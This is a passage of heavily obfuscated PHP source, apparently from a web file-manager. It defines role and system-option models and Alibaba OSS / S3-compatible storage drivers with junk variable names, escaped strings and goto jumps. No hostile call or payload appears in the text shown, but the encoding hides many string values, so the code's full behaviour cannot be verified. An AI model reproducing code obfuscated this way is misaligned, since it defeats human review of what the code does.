$ƒŸÆµÔ‚ =& $_SERVER[¿ğÚ‰±–]; $òŒù¾æŸ = $ƒŸÆµÔ‚[12]; if (!empty($îíÄ Ù·)) { $îíÄ Ù· = explode($ƒŸÆµÔ‚[50], $îíÄ Ù·); if (count($îíÄ Ù·) > 1) { $òŒù¾æŸ .= $ƒŸÆµÔ‚[51] . $îíÄ Ù·[1] . $ƒŸÆµÔ‚[52] . $îíÄ Ù·[0] . $ƒŸÆµÔ‚[53]; } else { $òŒù¾æŸ .= $ƒŸÆµÔ‚[51] . $îíÄ Ù·[0] . $ƒŸÆµÔ‚[53]; } } return $òŒù¾æŸ; } } goto E±·£¡æîó; eùó±­‹ÇÂ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\x6d\137\x6f\160\x74\x69\x6f\156"; protected $jsonField = array("\155\x65\x6e\x75", "\162\157\154\x65", "\162\x6f\154\x65\107\x72\157\165\160", "\162\x65\147\x69\x73\164", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($âù¬›Şé) { return "\123\x79\163\164\x65\x6d\117\x70\x74\151\157\156\x5f{$âù¬›Şé}"; } protected function optionDefault($·ƒ¬–› = '') { $ òÌªº =& $_SERVER[¿ğÚ‰±–]; if ($·ƒ¬–› == $ òÌªº[12]) { return $GLOBALS[$ òÌªº[6]][$ òÌªº[457]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x72\157\154\145\x4c\x69\163\x74"; public $field = array("\156\141\155\145", "\x61\x75\x74\x68", "\x6c\x61\x62\x65\x6c", "\144\x69\x73\x70\x6c\141\x79", "\x73\x79\163\x74\x65\x6d", "\x64\145\163\143", "\151\147\x6e\x6f\x72\145\105\x78\x74", "\x69\x67\156\x6f\162\145\x46\x69\154\x65\123\151\172\x65", "\141\144\155\x69\x6e\x69\x73\x74\162\141\x74\x6f\162", "\163\157\162\x74"); public function listData($ú…ÕÊö± = false, $áÖ±ÌÜÔ = "\x73\x6f\x72\164", $£Ó–ÙŠ = false) { $úÈãåïÏ =& $_SERVER[¿ğÚ‰±–]; $Ï€§çà = parent::listData($ú…ÕÊö±, $áÖ±ÌÜÔ, $£Ó–ÙŠ); if (!$ú…ÕÊö±) { foreach ($Ï€§çà as $³Ì”Œ²Ô => $…ÃÎšäª) { if ($…ÃÎšäª[$úÈãåïÏ[2183]] == 1) { $Ï€§çà[$³Ì”Œ²Ô][$úÈãåïÏ[526]] = LNG($úÈãåïÏ[2444]); } } } return $Ï€§çà; } public function update($´Òä», $ÎŠÊºÔÂ) { $ÈÇ´Ø¯ï =& $_SERVER[¿ğÚ‰±–]; $½Ä¦£ıö = parent::listData($´Òä»); $ ï“Ğåì = $this->findByName($ÎŠÊºÔÂ[$ÈÇ´Ø¯ï[32]]); if (!$½Ä¦£ıö || $ ï“Ğåì && $ ï“Ğåì[$ÈÇ´Ø¯ï[475]] != $½Ä¦£ıö[$ÈÇ´Ø¯ï[475]]) { return !1; } if ($ ï“Ğåì[$ÈÇ´Ø¯ï[2183]] == 1) { $ÎŠÊºÔÂ = array($ÈÇ´Ø¯ï[32] => $ÎŠÊºÔÂ[$ÈÇ´Ø¯ï[32]], $ÈÇ´Ø¯ï[1999] => $ÎŠÊºÔÂ[$ÈÇ´Ø¯ï[1999]]); } $this->filterAuth($ÎŠÊºÔÂ[$ÈÇ´Ø¯ï[487]]); return parent::update($´Òä», $ÎŠÊºÔÂ); } public function remove($ö°İàÊ) { $Ãåü´â› = parent::listData($ö°İàÊ); if (!$Ãåü´â› || $Ãåü´â›[$_SERVER[¿ğÚ‰±–][191]]) { return !1; } return parent::remove($ö°İàÊ); } public function add($ïÚ­Š´) { $âÇ Âİ† =& $_SERVER[¿ğÚ‰±–]; $×äá›‹ò = $ïÚ­Š´[$âÇ Âİ†[32]]; if ($this->findByName($×äá›‹ò)) { return !1; } $–¦›¬Ğû = array($âÇ Âİ†[494] => $×äá›‹ò, $âÇ Âİ†[1982] => $âÇ Âİ†[12], $âÇ Âİ†[1978] => $âÇ Âİ†[1986], $âÇ Âİ†[2445] => 1, $âÇ Âİ†[1981] => 0, $âÇ Âİ†[2446] => 0, $âÇ Âİ†[1980] => $this->getSort()); $ïÚ­Š´ = array_merge($–¦›¬Ğû, $ïÚ­Š´); $this->filterAuth($ïÚ­Š´[$âÇ Âİ†[487]]); return parent::insert($ïÚ­Š´); } private function getSort() { $Ğëë¼ş™ =& $_SERVER[¿ğÚ‰±–]; $ò’„ˆê€ = parent::listData(); $¶¿ÖÜå = array_to_keyvalue($ò’„ˆê€, $Ğëë¼ş™[12], $Ğëë¼ş™[2000]); return empty($¶¿ÖÜå) ? 0 : max($¶¿ÖÜå) + 1; } private function filterAuth(&$úÃ€°ã) { $–Æü–îÂ =& $_SERVER[¿ğÚ‰±–]; $÷Áùè­ = array(); $ÂŠ²Ë… = array_filter(explode($–Æü–îÂ[50], $úÃ€°ã)); foreach ($ÂŠ²Ë… as $úÃ€°ã) { $Â¼ş´ÓÍ = explode($–Æü–îÂ[10], $úÃ€°ã); if ($Â¼ş´ÓÍ[0] == $–Æü–îÂ[2447] && $Â¼ş´ÓÍ[1] != $–Æü–îÂ[1282]) { $û¸ãä = $Â¼ş´ÓÍ[0] . $–Æü–îÂ[10] . $Â¼ş´ÓÍ[1] . $–Æü–îÂ[2448]; if (!in_array($û¸ãä, $ÂŠ²Ë…)) { $÷Áùè­[] = $û¸ãä; } } $÷Áùè­[] = $úÃ€°ã; } $úÃ€°ã = implode($–Æü–îÂ[50], $÷Áùè­); } public function findRoleDefault() { $¯ËÜ»¥Ü =& $_SERVER[¿ğÚ‰±–]; $Šù…Œ²© = parent::listData(); $ÁÕù·µ± = !1; foreach ($Šù…Œ²© as $ÀÎü¤ ) { if (!$ÀÎü¤  || $ÀÎü¤ [$¯ËÜ»¥Ü[1998]] == $¯ËÜ»¥Ü[228] || $ÀÎü¤ [$¯ËÜ»¥Ü[2183]] == 1) { continue; } if (strstr($ÀÎü¤ [$¯ËÜ»¥Ü[487]], $¯ËÜ»¥Ü[2449])) { continue; } if (!strstr($ÀÎü¤ [$¯ËÜ»¥Ü[487]], $¯ËÜ»¥Ü[2450])) { continue; } if (!$ÁÕù·µ±) { $ÁÕù·µ± = $ÀÎü¤ ; continue; } $Ñ´ÀŠ¼æ = explode($¯ËÜ»¥Ü[50], $ÁÕù·µ±[$¯ËÜ»¥Ü[487]]); $şãñîöà = explode($¯ËÜ»¥Ü[50], $ÀÎü¤ [$¯ËÜ»¥Ü[487]]); if (count($Ñ´ÀŠ¼æ) > count($şãñîöà)) { $ÁÕù·µ± = $ÀÎü¤ ; } } return $ÁÕù·µ± ? $ÁÕù·µ±[$¯ËÜ»¥Ü[475]] : $¯ËÜ»¥Ü[12]; } public function sort($Ğî¹ß‡Ä, $­©»›£Ä) { return parent::update($Ğî¹ß‡Ä, $­©»›£Ä); } } goto f“§ÈŸÕÚ; D„İÄ³ƒØÒ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($—É–ŞìŞ) { parent::__construct($—É–ŞìŞ); $this->setSignVersion($_SERVER[¿ğÚ‰±–][247]); } public function fileOutLink($Œ°Ñ´ÛÂ) { $·«Ø §¾ =& $_SERVER[¿ğÚ‰±–]; if (substr($Œ°Ñ´ÛÂ, 0, 7) == $·«Ø §¾[313]) { $Œ°Ñ´ÛÂ = $·«Ø §¾[314] . substr($Œ°Ñ´ÛÂ, 7); } header($·«Ø §¾[175] . $Œ°Ñ´ÛÂ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($»Šû¡ö) { parent::__construct(); include_once SDK_DIR . $_SERVER[¿ğÚ‰±–][1467]; $this->_init($»Šû¡ö); } public function _init($‹«Š¦›Î) { $ªºØÏÛ =& $_SERVER[¿ğÚ‰±–]; $this->config = $‹«Š¦›Î; foreach ($‹«Š¦›Î as $ìÚ¡ «‘ => $ø¹•–Å„) { if (isset($this->{$ìÚ¡ «‘})) { $this->{$ìÚ¡ «‘} = $ø¹•–Å„; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ªºØÏÛ[1468] . LNG($ªºØÏÛ[1469])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Ù¯Šã™© =& $_SERVER[¿ğÚ‰±–]; $µ‚ó å‡ = new OSS\Model\CorsConfig(); $ªÍ¤æñ¢ = new OSS\Model\CorsRule(); $ªÍ¤æñ¢->addAllowedOrigin($Ù¯Šã™©[1470]); $ªÍ¤æñ¢->addAllowedMethod($Ù¯Šã™©[1471]); $ªÍ¤æñ¢->addAllowedMethod($Ù¯Šã™©[1472]); $ªÍ¤æñ¢->addAllowedMethod($Ù¯Šã™©[1473]); $ªÍ¤æñ¢->addAllowedMethod($Ù¯Šã™©[1474]); $ªÍ¤æñ¢->addAllowedMethod($Ù¯Šã™©[165]); $ªÍ¤æñ¢->setMaxAgeSeconds(600); $ªÍ¤æñ¢->addExposeHeader($Ù¯Šã™©[1475]); $ªÍ¤æñ¢->addAllowedHeader($Ù¯Šã™©[1470]); $µ‚ó å‡->addRule($ªÍ¤æñ¢); try { $this->client->putBucketCors($this->bucket, $µ‚ó å‡); } catch (OSS\Core\OssException $á¨™Ó¨») { $this->writeLog(__FUNCTION__ . $Ù¯Šã™©[214] . $á¨™Ó¨»->getMessage()); return !1; } return !0; } public function getBucketCors() { $ô©±¤Õë =& $_SERVER[¿ğÚ‰±–]; $…’“Ù”ã = null; try { $…’“Ù”ã = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ ¨½‹ã®) { $this->writeLog(__FUNCTION__ . $ô©±¤Õë[214] . $ ¨½‹ã®->getMessage()); return null; } if (!$…’“Ù”ã || !($–‹™‚¢Ç = $…’“Ù”ã->getRules())) { return null; } $¢¹ã¨³Ê = $–‹™‚¢Ç[0]->getAllowedOrigins(); $¥”ñ±ß« = $–‹™‚¢Ç[0]->getAllowedMethods(); $ÇÒÎ´Ûµ = $–‹™‚¢Ç[0]->getMaxAgeSeconds(); $µÓåßÆ = $–‹™‚¢Ç[0]->getExposeHeaders(); $íìú²² = $–‹™‚¢Ç[0]->getAllowedHeaders(); return array($ô©±¤Õë[218] => isset($¢¹ã¨³Ê[0]) ? $¢¹ã¨³Ê[0] : $ô©±¤Õë[12], $ô©±¤Õë[222] => $¥”ñ±ß«, $ô©±¤Õë[1476] => $ÇÒÎ´Ûµ, $ô©±¤Õë[1477] => isset($µÓåßÆ[0]) ? $µÓåßÆ[0] : $ô©±¤Õë[12], $ô©±¤Õë[219] => isset($íìú²²[0]) ? $íìú²²[0] : $ô©±¤Õë[12]); } public function isBucketCors() { $—ÛğåŞø =& $_SERVER[¿ğÚ‰±–]; $¾¦îÎŸ„ = $this->getBucketCors(); if (!$¾¦îÎŸ„ || !is_array($¾¦îÎŸ„)) { return !1; } if ($¾¦îÎŸ„[$—ÛğåŞø[218]] != $—ÛğåŞø[220] || $¾¦îÎŸ„[$—ÛğåŞø[219]] != $—ÛğåŞø[220]) { return !1; } $µˆ¹’ê¨ = array_map($—ÛğåŞø[221], $¾¦îÎŸ„[$—ÛğåŞø[222]]); if (!is_array($µˆ¹’ê¨)) { $µˆ¹’ê¨ = array(); } $é†¨ç = array($—ÛğåŞø[223], $—ÛğåŞø[224], $—ÛğåŞø[225], $—ÛğåŞø[226], $—ÛğåŞø[227]); $¨±¾µæÜ = array_diff($é†¨ç, $µˆ¹’ê¨); return empty($¨±¾µæÜ); } public function mkfile($ŠÍæ‚ÅĞ, $ƒÀ ëğ = '', $ªØÂùŒ = REPEAT_RENAME) { $ğâŞí¹” = $this->setContent($ŠÍæ‚ÅĞ, $ƒÀ ëğ); if ($ğâŞí¹” !== !1) { return $this->getPathOuter($ŠÍæ‚ÅĞ); } return !1; } public function mkdir($ñÈëá§°, $‡Ñù¿âò = REPEAT_SKIP) { if ($‡Ñù¿âò && $this->_isFolder($ñÈëá§°)) { return $this->getPathOuter($ñÈëá§°); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ñÈëá§°)); } catch (OSS\Core\OssException $÷²àÒæÍ) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][214] . $÷²àÒæÍ->getMessage()); return !1; } return $this->getPathOuter($ñÈëá§°); } private function fileList($ñ”ˆÌ¨±, $ş½À‘ƒ® = '', $‡Œ¬¹ñ = 0) { $™–¾‚¦ñ =& $_SERVER[¿ğÚ‰±–]; $ñ”ˆÌ¨± = trim($ñ”ˆÌ¨±, $™–¾‚¦ñ[8]); $úÆîÌá´ = empty($ñ”ˆÌ¨±) && $ñ”ˆÌ¨± !== $™–¾‚¦ñ[228] ? $™–¾‚¦ñ[12] : $ñ”ˆÌ¨± . $™–¾‚¦ñ[8]; $äòûÉ = $™–¾‚¦ñ[12]; $ÀåÍµ‘è = 1000; $™äÚ”£Á = $«ÑÉ³¦‰ = array(); while (!0) { check_abort(); $³š­§Æ³ = array($™–¾‚¦ñ[1478] => $ş½À‘ƒ®, $™–¾‚¦ñ[1479] => $úÆîÌá´, $™–¾‚¦ñ[1480] => $ÀåÍµ‘è, $™–¾‚¦ñ[1481] => $äòûÉ); try { $ÌØòÒ¢‘ = $this->client->listObjects($this->bucket, $³š­§Æ³); } catch (OSS\Core\OssException $˜º¥¹Ù¹) { $this->writeLog(__FUNCTION__ . $™–¾‚¦ñ[214] . $˜º¥¹Ù¹->getMessage()); break; } $äòûÉ = $ÌØòÒ¢‘->getNextMarker(); $°ã¥…—¶ = $ÌØòÒ¢‘->getObjectList(); $úõÁöß = $ÌØòÒ¢‘->getPrefixList(); foreach ($°ã¥…—¶ as $»Ú …Úµ) { if ($»Ú …Úµ->getKey() == $úÆîÌá´) { continue; } $°Œ¼ó  = $»Ú …Úµ->getKey(); $„‘¿³„ = $»Ú …Úµ->getSize(); $å–¬Şê¶ = $»Ú …Úµ->getLastModified(); $ÙÔæ—¼É = trim($»Ú …Úµ->getETag(), $™–¾‚¦ñ[121]); $áª“Ñ­ò = $‡Œ¬¹ñ ? array($™–¾‚¦ñ[32] => $°Œ¼ó , $™–¾‚¦ñ[79] => $„‘¿³„, $™–¾‚¦ñ[206] => strtotime($å–¬Şê¶), $™–¾‚¦ñ[1482] => $ÙÔæ—¼É) : $°Œ¼ó ; $è››‹ÒÀ = $„‘¿³„ == 0 && substr($°Œ¼ó , strlen($°Œ¼ó ) - 1, 1) == $™–¾‚¦ñ[8] ? !0 : !1; $—‹ã½î¢ = array($™–¾‚¦ñ[79] => $„‘¿³„, $™–¾‚¦ñ[1483] => $„‘¿³„, $™–¾‚¦ñ[88] => strtotime($å–¬Şê¶), $™–¾‚¦ñ[1484] => $å–¬Şê¶, $™–¾‚¦ñ[1482] => $ÙÔæ—¼É); $this->cacheMethodInfoSet($°Œ¼ó , $è››‹ÒÀ, $—‹ã½î¢); if ($è››‹ÒÀ) { $™äÚ”£Á[] = $°Œ¼ó ; continue; } $«ÑÉ³¦‰[] = $áª“Ñ­ò; } foreach ($úõÁöß as $ï‡ğ–³Ş) { $™äÚ”£Á[] = $ï‡ğ–³Ş->getPrefix(); $this->cacheMethodInfoSet($ï‡ğ–³Ş->getPrefix(), !0); } if ($äòûÉ === $™–¾‚¦ñ[12]) { break; } } $this->cacheMethodInfoSet($ñ”ˆÌ¨±, !0); return array($™–¾‚¦ñ[85] => $™äÚ”£Á, $™–¾‚¦ñ[86] => $«ÑÉ³¦‰); } public function listObject($¢‹ÀÀ¥Ú, $ÕÆÈáá = '') { $‚ğàô£Õ =& $_SERVER[¿ğÚ‰±–]; $¢‹ÀÀ¥Ú = trim($¢‹ÀÀ¥Ú, $‚ğàô£Õ[8]); $şÁ¬Â¬ä = empty($¢‹ÀÀ¥Ú) && $¢‹ÀÀ¥Ú !== $‚ğàô£Õ[228] ? $‚ğàô£Õ[12] : $¢‹ÀÀ¥Ú . $‚ğàô£Õ[8]; $¤şÃ«ğ’ = $‚ğàô£Õ[12]; $ ®¿Ö”Ê = 1000; $Ã û²ğÜ = $åı…ˆŠ° = array(); while (!0) { check_abort(); $è™–¢Ş¹ = array($‚ğàô£Õ[1478] => $ÕÆÈáá, $‚ğàô£Õ[1479] => $şÁ¬Â¬ä, $‚ğàô£Õ[1480] => $ ®¿Ö”Ê, $‚ğàô£Õ[1481] => $¤şÃ«ğ’); try { $·©Ü†£ƒ = $this->client->listObjects($this->bucket, $è™–¢Ş¹); } catch (OSS\Core\OssException $†”µ…å˜) { $this->writeLog(__FUNCTION__ . $‚ğàô£Õ[214] . $†”µ…å˜->getMessage()); break; } $¤şÃ«ğ’ = $·©Ü†£ƒ->getNextMarker(); $ú¤ßÑš¸ = $·©Ü†£ƒ->getObjectList(); foreach ($ú¤ßÑš¸ as $Î¢Ü€®) { if ($Î¢Ü€®->getKey() == $şÁ¬Â¬ä) { continue; } $ª ¾´İ = $Î¢Ü€®->getKey(); $‘Ø†Ãå = $Î¢Ü€®->getSize(); $ß¡Ø¨Á = $‘Ø†Ãå == 0 && substr($ª ¾´İ, strlen($ª ¾´İ) - 1, 1) == $‚ğàô£Õ[8] ? !0 : !1; if ($ß¡Ø¨Á) { continue; } $åı…ˆŠ°[] = $‘Ø†Ãå . $‚ğàô£Õ[214] . $ª ¾´İ; } if ($¤şÃ«ğ’ === $‚ğàô£Õ[12]) { break; } } return array($‚ğàô£Õ[85] => $Ã û²ğÜ, $‚ğàô£Õ[86] => $åı…ˆŠ°); } public function copyFile($Äú¼üİ, $¶ïÚÙş³) { $Àáêğ˜ = $this->size($Äú¼üİ); if ($Àáêğ˜ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Äú¼üİ, $this->bucket, $this->pathEncode($¶ïÚÙş³)); } catch (OSS\Core\OssException $Ô‚¬£Ûª) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][214] . $Ô‚¬£Ûª->getMessage()); return !1; } return $this->getPathOuter($¶ïÚÙş³); } $é×ˆø³½ = $this->multiCopyObject($Äú¼üİ, $¶ïÚÙş³, $Àáêğ˜); return $é×ˆø³½ ? $this->getPathOuter($¶ïÚÙş³) : !1; } private function multiCopyObject($ÔÌ§›ƒ, $ôø¬ğÃ±, $ÑİŸî) { $Ç°ÔÖ ç =& $_SERVER[¿ğÚ‰±–]; try { $‹ÁáñÊ† = array(); if ($Û¶â«ó = $this->hashMd5($ÔÌ§›ƒ)) { $‹ÁáñÊ† = array(OSS\OssClient::OSS_HEADERS => array($Ç°ÔÖ ç[1485] => $Û¶â«ó)); } $¬ªğ…Š³ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ôø¬ğÃ±), $‹ÁáñÊ†); $ãº¼Ÿˆ– = 1; $ş†È–„ó = 0; $ö‡£¡¨ = array(); $±Ç¯™‚× = 1024 * 1024 * 10; $ßÛ‘î‹® = $this->client->generateMultiuploadParts($ÑİŸî, $±Ç¯™‚×); foreach ($ßÛ‘î‹® as $´ğàò—ƒ => $˜ù‚ˆÃø) { $“ëÃ«ô = $ş†È–„ó + (int) $˜ù‚ˆÃø[$Ç°ÔÖ ç[1486]]; $éşØÛÎ = (int) $˜ù‚ˆÃø[$Ç°ÔÖ ç[413]] + $“ëÃ«ô - 1; $õ½ßÁİé = array($Ç°ÔÖ ç[167] => $“ëÃ«ô, $Ç°ÔÖ ç[168] => $éşØÛÎ); $ö‡£¡¨[] = $this->client->uploadPartCopy($this->bucket, $ÔÌ§›ƒ, $this->bucket, $this->pathEncode($ôø¬ğÃ±), $ãº¼Ÿˆ–, $¬ªğ…Š³, $õ½ßÁİé); $ãº¼Ÿˆ– = $ãº¼Ÿˆ– + 1; } $äÁğ«‘Ù = array(); foreach ($ö‡£¡¨ as $´ğàò—ƒ => $·”‡•ûÁ) { $äÁğ«‘Ù[] = array($Ç°ÔÖ ç[308] => $´ğàò—ƒ + 1, $Ç°ÔÖ ç[309] => $·”‡•ûÁ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ôø¬ğÃ±), $¬ªğ…Š³, $äÁğ«‘Ù); } catch (OSS\Core\OssException $Ğâ¸Ï®³) { $this->writeLog(__FUNCTION__ . $Ç°ÔÖ ç[214] . $Ğâ¸Ï®³->getMessage()); return !1; } return !0; } public function moveFile($ñ€Ì’µ†, $Ÿ´ìÅ¶ã) { if ($this->copyFile($ñ€Ì’µ†, $Ÿ´ìÅ¶ã)) { $this->remove($ñ€Ì’µ†); return $this->getPathOuter($Ÿ´ìÅ¶ã); } return !1; } public function delFile($¹ÕÖãÇö) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($¹ÕÖãÇö)); } catch (OSS\Core\OssException $ê¥à„†½) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][214] . $ê¥à„†½->getMessage()); return !1; } return !0; } public function delFolder($ØïÊ¹ïÀ) { $ı¾¦â›Æ =& $_SERVER[¿ğÚ‰±–]; if (!$this->exist($ØïÊ¹ïÀ)) { return !0; } $this->listItemCache = !1; $ÊÓ‡áØ = $this->fileList($ØïÊ¹ïÀ); $this->listItemCache = !0; $Ğ¥Ô•›« = trim($ØïÊ¹ïÀ, $ı¾¦â›Æ[8]) . $ı¾¦â›Æ[8]; if (!empty($ØïÊ¹ïÀ) && $ØïÊ¹ïÀ !== $ı¾¦â›Æ[228] && !in_array($Ğ¥Ô•›«, $ÊÓ‡áØ[$ı¾¦â›Æ[85]])) { $ÊÓ‡áØ[$ı¾¦â›Æ[85]][] = $Ğ¥Ô•›«; } $†²€éÙÁ = $this->delByBatch($ÊÓ‡áØ[$ı¾¦â›Æ[86]]); if (!$†²€éÙÁ) { return !1; } $†²€éÙÁ = $this->delByBatch($ÊÓ‡áØ[$ı¾¦â›Æ[85]]); if (!$†²€éÙÁ) { return !1; } return $this->delFile($Ğ¥Ô•›«); } private function delByBatch($¤”èÃó) { foreach (array_chunk($¤”èÃó, 1000) as $ˆ·é†íÕ) { try { $this->client->deleteObjects($this->bucket, $ˆ·é†íÕ); } catch (OSS\Core\OssException $§Úåİ) { $this->writeLog(__FUNCTION__ . $_SERVER[¿ğÚ‰±–][214] . $§Úåİ->getMessage()); return !1; } } return !0; } public function rename($Şš•®èÉ, $éğè¹°¢) { return $this->renameObject($Şš•®èÉ, $éğè¹°¢); } private function fileInfo($Ğœ€Øâü, $‰¢¬ùÎ¡ = false, $ê¨èÌÂ– = array()) { $ôŠÍ¿ö =& $_SERVER[¿ğÚ‰±–]; $Ö€êÕ£ç = array($ôŠÍ¿ö[32] => $this->pathThis($Ğœ€Øâü), $ôŠÍ¿ö[87] => $this->getPathOuter($Ğœ€Øâü), $ôŠÍ¿ö[33] => $ôŠÍ¿ö[230], $ôŠÍ¿ö[79] => isset($ê¨èÌÂ–[$ôŠÍ¿ö[79]]) ? $ê¨èÌÂ–[$ôŠÍ¿ö[79]] : 0, $ôŠÍ¿ö[169] => $this->ext($Ğœ€Øâü)); if ($‰¢¬ùÎ¡) { return $Ö€êÕ£ç; } $Ö€êÕ£ç[$ôŠÍ¿ö[231]] = $Ö€êÕ£ç[$ôŠÍ¿ö[88]] = 0; $Ö€êÕ£ç[$ôŠÍ¿ö[232]] = $Ö€êÕ£ç[$ôŠÍ¿ö[233]] = !0; if (empty($ê¨èÌÂ–)) { $ˆô¦Î¶É = $this->objectMeta($Ğœ€Øâü); if (!$ˆô¦Î¶É) { return $Ö€êÕ£ç; } $ê¨èÌÂ– = array($ôŠÍ¿ö[88] => strtotime($ˆô¦Î¶É[$ôŠÍ¿ö[1484]]), $ôŠÍ¿ö[79] => $ˆô¦Î¶É[$ôŠÍ¿ö[1483]] + 0, $ôŠÍ¿ö[1482] => $ˆô¦Î¶É[$ôŠÍ¿ö[1482]]); } if (isset($ê¨èÌÂ–[$ôŠÍ¿ö[1482]]) && $ê¨èÌÂ–[$ôŠÍ¿ö[1482]]) { $Ö€êÕ£ç[$ôŠÍ¿ö[235]] = trim($ê¨èÌÂ–[$ôŠÍ¿ö[1482]], $ôŠÍ¿ö[121]); } if (isset($ê¨èÌÂ–[$ôŠÍ¿ö[79]])) { $Ö€êÕ£ç[$ôŠÍ¿ö[79]] = $ê¨èÌÂ–[$ôŠÍ¿ö[79]]; } if (isset($ê¨èÌÂ–[$ôŠÍ¿ö[88]])) { $Ö€êÕ£ç[$ôŠÍ¿ö[88]] = $ê¨èÌÂ–[$ôŠÍ¿ö[88]]; } if (isset($ê¨èÌÂ–[$ôŠÍ¿ö[206]]) && !trim($Ö€êÕ£ç[$ôŠÍ¿ö[88]])) { $Ö€êÕ£ç[$ôŠÍ¿ö[88]] = $ê¨èÌÂ–[$ôŠÍ¿ö[206]]; } return $Ö€êÕ£ç; } private function folderInfo($”úİšµ¾, $¼”„Ø° = false, $¸‰°Í‰¦ = array()) { $§Ø—êùö =& $_SERVER[¿ğÚ‰±–]; $ªÆÍ´ÍÜ = array($§Ø—êùö[32] => $this->pathThis($”úİšµ¾), $§Ø—êùö[87] => $this->getPathOuter($§Ø—êùö[8] . $”úİšµ¾), $§Ø—êùö[33] => $§Ø—êùö[78]); if ($¼”„Ø°) { return $ªÆÍ´ÍÜ; } $ªÆÍ´ÍÜ[$§Ø—êùö[231]] = $ªÆÍ´ÍÜ[$§Ø—êùö[88]] = 0; $ªÆÍ´ÍÜ[$§Ø—êùö[232]] = $ªÆÍ´ÍÜ[$§Ø—êùö[233]] = !0; if (empty($¸‰°Í‰¦)) { $”úİšµ¾ = rtrim($”úİšµ¾, $§Ø—êùö[8]) . $§Ø—êùö[8]; $¼´¨Ø = $this->objectMeta($”úİšµ¾); if (!$¼´¨Ø) { return $ªÆÍ´ÍÜ; } $¸‰°Í‰¦ = array($§Ø—êùö[231] => $¼´¨Ø[$§Ø—êùö[575]][$§Ø—êùö[1487]], $§Ø—êùö[88] => strtotime($¼´¨Ø[$§Ø—êùö[1484]])); } if (isset($¸‰°Í‰¦[$§Ø—êùö[88]])) { $ªÆÍ´ÍÜ[$§Ø—êùö[88]] = $¸‰°Í‰¦[$§Ø—êùö[88]]; } if (isset($¸‰°Í‰¦[$§Ø—êùö[231]])) { $ªÆÍ´ÍÜ[$§Ø—êùö[231]] = $¸‰°Í‰¦[$§Ø—êùö[231]]; } return $ªÆÍ´ÍÜ; } public function listPath($ÀÕÑÑ¯ğ, $¿œÛÌ’À = false) { $‚‡ø¬Ÿ¾ =& $_SERVER[¿ğÚ‰±–]; $Èƒ°åŞ‰ = $this->fileList($ÀÕÑÑ¯ğ, $‚‡ø¬Ÿ¾[8], !0); foreach ($Èƒ°åŞ‰[$‚‡ø¬Ÿ¾[85]] as $¸ñìéÔª => $«ë‡êğ) { $Èƒ°åŞ‰[$‚‡ø¬Ÿ¾[85]][$¸ñìéÔª] = $this->folderInfo($«ë‡êğ, $¿œÛÌ’À, $«ë‡êğ); } foreach ($Èƒ°åŞ‰[$‚‡ø¬Ÿ¾[86]] as $¸ñìéÔª => $«ë‡êğ) { $Èƒ°åŞ‰[$‚‡ø¬Ÿ¾[86]][$¸ñìéÔª] = $this->fileInfo($«ë‡êğ[$‚‡ø¬Ÿ¾[32]], $¿œÛÌ’À, $«ë‡êğ); } return $Èƒ°åŞ‰; } protected function infoChildren($úŠú´„Ø, &$¬‰·ıÛê) { $¢ÆÌ™æÜ =& $_SERVER[¿ğÚ‰±–]; $ş¦‹éĞç = $this->fileList($úŠú´„Ø, $¢ÆÌ™æÜ[12], !0); $¬‰·ıÛê[$¢ÆÌ™æÜ[81]] += count($ş¦‹éĞç[$¢ÆÌ™æÜ[85]]); $¬‰·ıÛê[$¢ÆÌ™æÜ[80]] += count($ş¦‹éĞç[$¢ÆÌ™æÜ[86]]); foreach ($ş¦‹éĞç[$¢ÆÌ™æÜ[86]] as $òËÛéÄ¼) { if (!$òËÛéÄ¼ || !$òËÛéÄ¼[$¢ÆÌ™æÜ[79]]) { continue; } $¬‰·ıÛê[$¢ÆÌ™æÜ[79]] += $òËÛéÄ¼[$¢ÆÌ™æÜ[79]]; } } public function has($÷ÜĞ¯³, $ ÎÙãÇó = false, $ß×‹ìñ = true) { $«ÏŠµàÃ =& $_SERVER[¿ğÚ‰±–]; $÷ÜĞ¯³ = trim($÷ÜĞ¯³, $«ÏŠµàÃ[8]); $õ½”¨° = empty($÷ÜĞ¯³) && $÷ÜĞ¯³ !== $«ÏŠµàÃ[228] ? $«ÏŠµàÃ[12] : $÷ÜĞ¯³ . $«ÏŠµàÃ[8]; $‹é¯³Å„ = $«ÏŠµàÃ[12]; $ÜäÎ ‡¾ = 500; $®Îá¦ÏË = $Ñçï–ß = 0; while (!0) { check_abort(); $­ò è»Å = array($«ÏŠµàÃ[1478] => $«ÏŠµàÃ[8], $«ÏŠµàÃ[1479] => $õ½”¨°, $«ÏŠµàÃ[1480] => $ÜäÎ ‡¾, $«ÏŠµàÃ[1481] => $‹é¯³Å„); try { $ü½ØÜ— = $this->client->listObjects($this->bucket, $­ò è»Å); } catch (OSS\Core\OssException $˜ú£¹”) { $this->writeLog(__FUNCTION__ . $«ÏŠµàÃ[214] . $˜ú£¹”->getMessage()); break; } $‹é¯³Å„ = $ü½ØÜ—->getNextMarker(); $•à¦˜İª = $ü½ØÜ—->getObjectList(); $ÛÉ§¡Ô‡ = $ü½ØÜ—->getPrefixList(); if ($ ÎÙãÇó) { if (count($•à¦˜İª) > 1 || count($•à¦˜İª) == 1 && 